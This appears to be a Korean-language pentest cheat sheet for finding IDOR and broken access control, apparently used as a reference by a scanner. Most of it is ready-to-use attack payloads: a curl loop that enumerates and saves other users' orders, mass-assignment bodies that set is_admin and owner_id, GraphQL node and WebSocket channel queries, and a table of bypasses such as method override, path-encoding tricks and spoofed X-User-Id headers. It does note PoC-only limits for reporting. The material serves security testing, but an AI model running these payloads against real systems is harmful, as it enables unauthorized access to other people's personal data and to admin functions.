**계정 요구사항:** 최소 2개 — 계정 A (리소스 소유자), 계정 B (무권한 사용자). 수직 IDOR은 USER + ADMIN 추가.

### 기본 페이로드

**수평 IDOR (다른 사용자 리소스 접근):**
```
# 1. 계정 A로 자신 ID 획득
GET /api/orders → response: { id: 123, ... }

# 2. 계정 B 세션으로 계정 A의 ID 접근
GET /api/orders/123  Cookie: session=B
→ 200 + 계정 A 데이터 반환 시 확인됨
```

**수직 IDOR (관리자 라우트):**
```
GET  /api/admin/users        Cookie: session=USER
DELETE /api/admin/users/999  Cookie: session=USER
PUT  /api/admin/config       Cookie: session=USER
```

**리소스 enumeration (순차 ID/UUID):**
```
# 순차 ID
for i in $(seq 1 100); do
  curl -s -H "Cookie: session=B" "https://target/api/orders/$i" -o "/tmp/order_$i.json"
done

# UUID도 다른 사용자가 ID를 알면 동일 — UUID는 보안 아님
```

**Mass assignment** (`MASS_ASSIGNMENT` 라벨):
```json
PATCH /api/profile  Cookie: session=USER
{
  "name": "x",
  "owner_id": "victim_id",
  "tenant_id": "other_tenant",
  "is_admin": true,
  "role": "admin"
}
```

**Batch IDOR** (`BATCH_PARTIAL` 라벨):
```json
POST /api/orders/batch  Cookie: session=B
{ "ids": [B_OWN_ID, A_OWN_ID, ANOTHER_USER_ID] }
```

**GraphQL `node(id:)` 글로벌 resolver** (`GRAPHQL_NODE` 라벨):
```graphql
{ node(id: "VXNlcjox") { ... on User { email phone } } }
{ node(id: "QWRtaW46MQ==") { ... on Admin { secrets } } }
```

**중첩 resolver IDOR (GraphQL field-level):**
```graphql
{ user(id: "OWN") { posts { owner { email phone ssn } } } }
```

**WebSocket 채널 IDOR:**
```javascript
const ws = new WebSocket('wss://target/ws');
ws.onopen = () => ws.send(JSON.stringify({type:'subscribe', channel:'/user/OTHER_ID/notifications'}));
```

**Email/Phone 기반 enumeration:**
```
GET /api/users?email=victim@example.com
GET /api/users?phone=01012345678
GET /api/profile?username=admin
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 권한 체크가 일부 method만 (GET) | 동일 라우트 PUT/DELETE/PATCH/HEAD/OPTIONS, `X-HTTP-Method-Override: PUT` + POST, `_method=DELETE` form |
| ID 타입 캐스트 후 검증 | `parseInt('123abc')` → 123 통과, `0123` (octal-like), `-123` (음수), `123.0`, `123e0` (과학표기) |
| Path 정규화 누락 | `/users/123/`, `/users/.//123`, `/users/%2e/123`, `/users/%31%32%33`, `/users/123#`, `/users/123;param=x`, `/users/123?` |
| 정책 default-allow | 정의 안 된 액션 — `POST /api/orders/123/some-undefined-action`, `/api/users/123/.json` |
| Substring/prefix 권한 검사 | `currentUser.startsWith('123')` → `12` 사용자가 `123` 접근, `1230` 등 |
| Capability token 추측 | UUID 외 sequential token, 짧은 token, timestamp 기반 |
| 권한 체크 후 ID 재조회 (TOCTOU) | 동시 요청으로 검증과 사용 사이 race |
| Email/Phone 기반 식별 | `?email=victim@example.com` 직접 — PII가 식별자 |
| 정책 라이브러리 cache stale | 권한 변경 후 cache TTL 동안 이전 권한 잔존 |
| Header 기반 사용자 ID 신뢰 | `X-User-Id`, `X-User-Email` 같은 신뢰 헤더 변조 |
| 404 vs 403 oracle | 응답 차이로 리소스 존재 여부 추정 (enumeration) |

**Authorization 헤더 swap:**
```
# 토큰 swap
curl -H "Authorization: Bearer <token_B>" -H "X-User-Id: <user_A_id>" "https://target/api/profile"

# X-Forwarded-User 헤더 (gateway 신뢰 시)
curl -H "Cookie: session=B" -H "X-Forwarded-User: admin" "https://target/api/admin"

# Bearer + Cookie 동시 (혼재 시 서버 우선순위 차이)
curl -H "Authorization: Bearer X" -H "Cookie: session=B" ...
```

**Cursor/Pagination decode:**
```
# Base64 cursor에 사용자 컨텍스트 노출
echo "eyJ1c2VyX2lkIjoxMjMsIm9mZnNldCI6MH0=" | base64 -d
# {"user_id":123,"offset":0} → user_id 변조 시도
```

---

### 참고사항

- 가장 흔한 수직 IDOR: 비밀번호 변경, 이메일 변경, 2FA 비활성화, 계정 삭제, 결제 정보 변경
- 가장 흔한 수평 IDOR: 첨부파일 다운로드 (`/files/:id/download`), 프로필 사진 (`/users/:id/avatar`), 주문 조회, 리뷰 수정
- 검색 결과에 권한 외 데이터 포함 시 → 검색으로 ID 알아낸 후 직접 조회로 우회
- 멀티테넌시 `org_id` 파라미터가 사용자 입력이면 다른 조직 리소스 접근
- Pagination cursor decode 시 다른 사용자 컨텍스트 노출 사례
- WebSocket 채널 구독 (`subscribe('/user/:id/notifications')`)에 ID 검증 누락
- 404 vs 403 응답 차이로 리소스 존재 oracle 가능 — 일관 응답 권장
- 이메일/전화번호 조회 가능한 API는 PII가 식별자라 IDOR 외 enumeration 영향
- GraphQL `node(id:)` Relay global resolver는 모든 타입 ID로 조회 — Base64 디코드 후 typename 추측
- Mass assignment는 IDOR(`owner_id`/`tenant_id`)와 PRIV_ESCALATION(`role`/`is_admin`) 두 영역 — 라벨 분리
- 멀티 계정 테스트 필수 — 계정 A로 ID 획득 + 계정 B 세션으로 접근
- 보고 시 다른 사용자 데이터 1건만 노출 (PoC), 대량 enumeration 금지
- `/api/admin/*` 라우트가 일반 인증 미들웨어와 동일 chain이면 권한 미들웨어 누락 점검
- `X-User-Id` 같은 신뢰 헤더는 gateway 환경에서 변조 가능 — host-header-scanner와 결합
